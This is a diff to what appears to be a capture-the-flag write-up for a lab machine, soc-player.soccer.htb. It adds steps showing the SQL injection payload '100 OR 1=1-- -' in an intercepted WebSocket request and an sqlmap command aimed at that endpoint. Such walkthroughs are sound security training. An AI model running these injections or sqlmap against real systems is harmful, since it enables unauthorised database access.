@@ -239,3 +239,14 @@ while
 100 OR 1=1-- - is a valid SQL injection
 
 ![image tooltip](/images/Screenshot%202025-05-07%20211412.png)
+
+We then open BurpSuite to intercept the request when entering the SQL injection where we get the following WebSocket request:
+```
+{
+	"id":"100 OR 1=1-- -"
+}
+```
+We can then copy to file and use this with sqlmap specifying WebSocket:
+```
+sqlmap -u 'ws://soc-player.soccer.htb:9091/' -d '{"id":"*"}' --batch
+```
